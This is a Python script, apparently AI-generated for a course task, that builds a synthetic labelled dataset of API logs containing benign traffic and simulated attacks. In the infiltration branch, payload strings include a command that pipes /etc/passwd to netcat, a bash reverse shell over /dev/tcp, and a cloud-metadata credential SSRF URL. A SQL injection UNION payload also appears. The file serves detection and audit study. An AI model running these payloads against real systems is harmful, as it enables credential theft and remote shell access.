"""
Prompt given to generate this python file using gemini 3.8 Flash medium model

Based on the attached Week1 handout, working on path 3 as specified in the handout, generate python code to create
dataset file for security audit or incident investigation with security threats like DoS, Ddos, SQL Injection,
brute force, etc that are typical with enterprise applications. The dataset should contain all the columns and the
information to align with the submission task.
"""
import datetime
import random
import uuid
import numpy as np
import pandas as pd


def generate_enterprise_logs(num_records=150000, output_path="data/api_security_audit_logs.csv"):
    services = [
        "auth-gateway",
        "payment-service",
        "user-profile",
        "orders-api",
        "inventory-service",
        "admin-console",
        "api-load-balancer",
    ]
    endpoints = [
        "/api/v1/login",
        "/api/v1/checkout",
        "/api/v1/users/me",
        "/api/v2/orders",
        "/api/v1/config",
        "/admin/system/metrics",
        "/healthz",
        "/api/v1/internal/sync",
    ]
    http_methods = ["GET", "POST", "PUT", "DELETE"]
    standard_user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)",
        "PostmanRuntime/7.39.0",
        "curl/8.4.0",
    ]
    regions = ["us-east-1", "us-west-2", "eu-central-1", "ap-south-1"]
    status_codes_normal = [200, 201, 204, 400, 401, 403, 404, 500]
    weights_normal = [0.72, 0.10, 0.05, 0.04, 0.04, 0.02, 0.02, 0.01]

    # Timestamp series over past 7 days
    start_time = datetime.datetime.now() - datetime.timedelta(days=7)
    timestamps = [
        start_time + datetime.timedelta(seconds=int(s))
        for s in np.random.uniform(0, 7 * 86400, num_records)
    ]
    timestamps.sort()

    # IP pools
    normal_ips = [f"192.168.1.{i}" for i in range(10, 80)] + [f"10.0.0.{i}" for i in range(1, 255)]
    targeted_attacker_ips = ["198.51.100.24", "203.0.113.195", "45.33.32.156", "185.220.101.5"]
    botnet_ddos_ips = [f"172.56.{random.randint(1, 254)}.{random.randint(1, 254)}" for _ in range(300)]
    dos_single_source_ip = "198.18.0.99"

    attack_types = [
        "SQL_INJECTION",
        "BRUTE_FORCE",
        "DOS_SLOWLORIS",
        "DDOS_L7_FLOOD",
        "INFILTRATION",
        "HEARTBLEED",
        "PRIVILEGE_ABUSE",
    ]
    attack_weights = [0.15, 0.20, 0.15, 0.25, 0.10, 0.08, 0.07]

    records = []

    for i in range(num_records):
        # 94% benign traffic, 6% attack events
        is_attack = random.random() < 0.06
        timestamp = timestamps[i]

        if not is_attack:
            endpoint = random.choice(endpoints)
            method = "GET" if endpoint in ["/healthz", "/admin/system/metrics"] else random.choice(http_methods)
            status = np.random.choice(status_codes_normal, p=weights_normal)
            latency = max(8, int(np.random.normal(loc=95, scale=28)))
            client_ip = random.choice(normal_ips)
            ua = random.choice(standard_user_agents)
            service = random.choice(services)
            anomaly_label = "BENIGN"
            payload = '{"status": "ok", "action": "standard_request"}'
            response_bytes = random.randint(250, 4800)
        else:
            attack_cat = np.random.choice(attack_types, p=attack_weights)

            if attack_cat == "DOS_SLOWLORIS":
                service = "api-load-balancer"
                endpoint = "/api/v1/login"
                method = "POST"
                status = 408  # Request Timeout
                latency = random.randint(28000, 30000)  # Hung sockets
                client_ip = dos_single_source_ip
                ua = "Slowloris/0.2.4 (DDoS-Tool)"
                payload = "X-a: b\r\nX-b: c\r\n[STREAM_STALLED]"
                response_bytes = random.randint(100, 350)
                anomaly_label = "DOS"

            elif attack_cat == "DDOS_L7_FLOOD":
                service = random.choice(["payment-service", "orders-api"])
                endpoint = random.choice(["/api/v1/checkout", "/api/v2/orders"])
                method = "POST"
                status = random.choice([503, 504])  # Service unavailable / Gateway timeout
                latency = random.randint(4500, 15000)
                client_ip = random.choice(botnet_ddos_ips)
                ua = random.choice(["Go-http-client/1.1", "Python/3.11 aiohttp", "Apache-HttpClient/4.5.13"])
                payload = f'{{"flood_token": "{uuid.uuid4().hex[:10]}", "payload_junk": "0x{"FF"*64}"}}'
                response_bytes = 0
                anomaly_label = "DDOS"

            elif attack_cat == "INFILTRATION":
                service = "auth-gateway"
                endpoint = "/api/v1/internal/sync"
                method = "POST"
                status = random.choice([200, 500])
                latency = random.randint(350, 1200)
                client_ip = random.choice(targeted_attacker_ips)
                ua = "curl/7.68.0"
                payload = random.choice([
                    "; cat /etc/passwd | nc 198.51.100.24 4444",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "/bin/bash -i >& /dev/tcp/45.33.32.156/8080 0>&1",
                ])
                response_bytes = random.randint(8000, 24000)
                anomaly_label = "INFILTRATION"

            elif attack_cat == "HEARTBLEED":
                service = "auth-gateway"
                endpoint = "/api/v1/login"
                method = "POST"
                status = 200
                latency = random.randint(45, 120)
                client_ip = random.choice(targeted_attacker_ips)
                ua = "OpenSSL/1.0.1f-exploit-poc"
                # Simulates TLS heartbeat payload length mismatch extracting memory heap
                payload = "TLS1.1 Record Layer: Heartbeat Request (Length: 65535, Payload_Real: 1 byte)"
                response_bytes = 65535  # Leaked memory buffer
                anomaly_label = "HEARTBLEED"

            elif attack_cat == "SQL_INJECTION":
                service = "user-profile"
                endpoint = "/api/v1/users/me"
                method = "GET"
                status = 500
                latency = random.randint(400, 1800)
                client_ip = random.choice(targeted_attacker_ips)
                ua = "sqlmap/1.7.12#stable"
                payload = "id=101' UNION ALL SELECT NULL, NULL, password_hash, session_token FROM accounts--"
                response_bytes = random.randint(1200, 3200)
                anomaly_label = "SQL_INJECTION"

            elif attack_cat == "BRUTE_FORCE":
                service = "auth-gateway"
                endpoint = "/api/v1/login"
                method = "POST"
                status = 401
                latency = random.randint(35, 75)
                client_ip = random.choice(targeted_attacker_ips)
                ua = "Hydra/9.5 (Network Logon Cracker)"
                payload = f'{{"user": "root", "attempt_seq": {random.randint(1000, 9999)}}}'
                response_bytes = random.randint(180, 260)
                anomaly_label = "BRUTE_FORCE"

            else:  # PRIVILEGE_ABUSE
                service = "admin-console"
                endpoint = "/admin/system/metrics"
                method = "DELETE"
                status = 403
                latency = random.randint(80, 220)
                client_ip = random.choice(targeted_attacker_ips)
                ua = "curl/8.4.0"
                payload = '{"grant_role": "CLUSTER_ADMIN", "target_user": "external_guest"}'
                response_bytes = random.randint(300, 550)
                anomaly_label = "PRIVILEGE_ABUSE"

        records.append({
            "trace_id": uuid.uuid4().hex[:12],
            "timestamp": timestamp.isoformat(),
            "service_name": service,
            "region": random.choice(regions),
            "http_method": method,
            "endpoint": endpoint,
            "status_code": status,
            "latency_ms": latency,
            "response_bytes": response_bytes,
            "client_ip": client_ip,
            "user_agent": ua,
            "payload_snippet": payload,
            "label": anomaly_label,
        })

    df = pd.DataFrame(records)
    df.to_csv(output_path, index=False)
    print(f"Generated {num_records} enterprise logs to '{output_path}'.")
    print("\nDataset Class Breakdown:")
    print(df["label"].value_counts())


if __name__ == "__main__":
    generate_enterprise_logs(num_records=150000)
